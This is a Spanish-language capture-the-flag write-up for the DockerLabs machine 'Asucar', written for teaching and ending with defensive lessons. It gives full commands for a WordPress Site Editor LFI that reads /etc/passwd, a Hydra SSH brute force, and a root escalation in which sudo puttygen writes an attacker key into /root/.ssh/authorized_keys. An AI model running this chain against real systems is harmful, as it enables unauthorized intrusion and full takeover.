# Asucar — DockerLabs

| Campo        | Detalle                                                                      |
|--------------|------------------------------------------------------------------------------|
| 🏷️ Plataforma | DockerLabs                                                                   |
| 💻 SO         | Linux                                                                        |
| 📊 Dificultad | Media                                                                        |
| 🔑 Técnicas   | Nmap, WordPress, LFI, Searchsploit, Hydra, SSH, PuTTYgen Privesc            |

---

## Índice

1. [Reconocimiento](#1-reconocimiento)
2. [Análisis de la aplicación web](#2-análisis-de-la-aplicación-web)
3. [Local File Inclusion — Plugin Site Editor](#3-local-file-inclusion--plugin-site-editor)
4. [Fuerza bruta con Hydra](#4-fuerza-bruta-con-hydra)
5. [Acceso SSH](#5-acceso-ssh)
6. [Escalada de privilegios con PuTTYgen](#6-escalada-de-privilegios-con-puttygen)
7. [Conclusiones](#7-conclusiones)

---

## 1. Reconocimiento

Desplegamos la máquina y escaneamos todos los puertos:

```bash
sudo nmap -sS -sV -sC -Pn -n -vvv -T5 -p- 172.17.0.2
```

![Escaneo Nmap](imgs/Pasted%20image%2020261017181437.png)

Puertos abiertos:
- **22/tcp** — SSH (sin credenciales, de momento lo dejamos)
- **80/tcp** — HTTP (Apache con WordPress)

---

## 2. Análisis de la aplicación web

Accedemos a `http://172.17.0.2` desde el navegador y confirmamos que es un **WordPress**:

![Web WordPress](imgs/Pasted%20image%2020261017182344.png)

Usamos `curl` con `grep` para identificar los plugins instalados — los plugins de WordPress son una fuente habitual de vulnerabilidades:

```bash
curl http://172.17.0.2/ | grep "plugin"
```

![Plugins detectados](imgs/Pasted%20image%2020261017183726.png)

Identificamos el plugin **Site Editor** activo. Buscamos vulnerabilidades conocidas con Searchsploit:

```bash
searchsploit site editor wordpress
```

![Searchsploit resultado](imgs/Pasted%20image%2020261017184213.png)

Encontramos un **Local File Inclusion (LFI)** — podemos leer archivos internos del servidor.

---

## 3. Local File Inclusion — Plugin Site Editor

Descargamos el exploit para analizar el PoC:

```bash
searchsploit -m php/webapps/44340.txt
cat 44340.txt
```

![PoC LFI](imgs/Pasted%20image%2020261017184403.png)

Sustituimos el host del PoC por la IP de la máquina víctima y ejecutamos. La respuesta incluye el contenido de `/etc/passwd`, donde encontramos el usuario **curiosito**:

![Usuario descubierto](imgs/Pasted%20image%2020261017185426.png)

---

## 4. Fuerza bruta con Hydra

Con el usuario identificado, lanzamos un ataque de fuerza bruta contra SSH:

```bash
hydra -l curiosito -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh
```

![Hydra resultado](imgs/Pasted%20image%2020261017185822.png)

✅ Credenciales obtenidas: `curiosito : password1`

---

## 5. Acceso SSH

Accedemos con las credenciales encontradas:

```bash
ssh curiosito@172.17.0.2
```

> 💡 Si aparece un error de host key, el propio mensaje indica cómo resolverlo con `ssh-keygen -R`.

![Acceso SSH](imgs/Pasted%20image%2020261017190035.png)

---

## 6. Escalada de privilegios con PuTTYgen

Ejecutamos el reconocimiento post-explotación estándar:

```bash
whoami
cat /etc/passwd
sudo -l
```

`sudo -l` revela que `curiosito` puede ejecutar **puttygen** como root sin contraseña:

```
(root) NOPASSWD: /usr/bin/puttygen
```

La escalada se basa en que `puttygen` puede leer una clave privada y exportar su clave pública a cualquier ruta — incluyendo `/root/.ssh/authorized_keys`. Al ejecutarse como root via sudo, tiene permisos de escritura en ese directorio.

**Pasos:**

Generamos un par de claves SSH en `/tmp`:

```bash
ssh-keygen -t rsa -f /tmp/id_rsa -N ""
```

Usamos `puttygen` con sudo para escribir la clave pública directamente en `authorized_keys` de root:

```bash
sudo /usr/bin/puttygen /tmp/id_rsa -O public-openssh -o /root/.ssh/authorized_keys
```

- `/tmp/id_rsa` — clave privada generada
- `-O public-openssh` — exporta en formato OpenSSH
- `-o /root/.ssh/authorized_keys` — escribe en las claves autorizadas de root

![PuTTYgen ejecutado](imgs/Pasted%20image%2020261017195225.png)

Nos conectamos como root usando nuestra clave privada:

```bash
ssh -i /tmp/id_rsa root@localhost
```

![Root obtenido](imgs/Pasted%20image%2020261017195258.png)

✅ Acceso root conseguido. Máquina comprometida.

---

## 7. Conclusiones

Una máquina que encadena tres vectores muy comunes en entornos reales: un plugin de WordPress vulnerable, credenciales débiles y un binario con sudo mal configurado.

**Lecciones clave:**
- 🔒 Auditar y actualizar los plugins de WordPress — son el principal vector de ataque en este CMS.
- 🔒 Nunca usar contraseñas débiles como `password1` en usuarios del sistema.
- 🔒 Aplicar el principio de mínimo privilegio en `sudo` — cualquier binario que maneje archivos puede convertirse en una vía de escalada si se ejecuta como root.

---

*Writeup realizado con fines educativos en un entorno controlado.* 🛡️
